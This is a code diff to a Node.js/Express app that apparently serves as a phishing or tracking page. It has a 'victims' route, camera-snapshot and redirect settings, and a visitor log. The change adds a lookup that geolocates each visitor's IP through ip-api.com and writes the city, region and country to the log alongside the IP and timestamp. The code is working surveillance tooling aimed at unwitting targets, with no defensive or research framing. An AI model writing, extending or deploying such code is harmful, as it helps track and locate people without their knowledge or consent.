@@ -10,15 +10,43 @@ app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(express.static("public"));
 app.set("view engine", "ejs");
-app.get("/", (req, res) => {
-var ip;
-var d = new Date();
-d=d.toJSON().slice(0,19).replace('T',':');
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-res.render("index",{ip:ip,time:d,redirect:config.redirectURL,camera:config.camera,cams:config.camsnaps,location:config.location});
-fs.appendFile('./views/log.txt',"Visit Form: "+ip+" | At:"+d+"\n\n", function (err) {
-if (err) throw err;
-});
+const axios = require('axios'); // Add this at the top if it's not there yet
+app.get("/", async (req, res) => {
+    let ip;
+    let d = new Date();
+    d = d.toJSON().slice(0, 19).replace('T', ':');
+
+    if (req.headers['x-forwarded-for']) {
+        ip = req.headers['x-forwarded-for'].split(",")[0];
+    } else if (req.connection && req.connection.remoteAddress) {
+        ip = req.connection.remoteAddress;
+    } else {
+        ip = req.ip;
+    }
+
+    let location = "Unknown";
+    try {
+        const response = await axios.get(`http://ip-api.com/json/${ip}`);
+        const data = response.data;
+        if (data.status === "success") {
+            location = `${data.city}, ${data.regionName}, ${data.country}`;
+        }
+    } catch (error) {
+        console.error("GeoIP lookup failed:", error.message);
+    }
+
+    res.render("index", {
+        ip: ip,
+        time: d,
+        redirect: config.redirectURL,
+        camera: config.camera,
+        cams: config.camsnaps,
+        location: location
+    });
+
+    fs.appendFile('./views/log.txt', `Visit Form: ${ip} | At: ${d} | Location: ${location}\n\n`, function (err) {
+        if (err) throw err;
+    });
 });
 app.get("/victims",(req,res)=>{res.render("victims");});
 app.post("/",(req,res)=>{
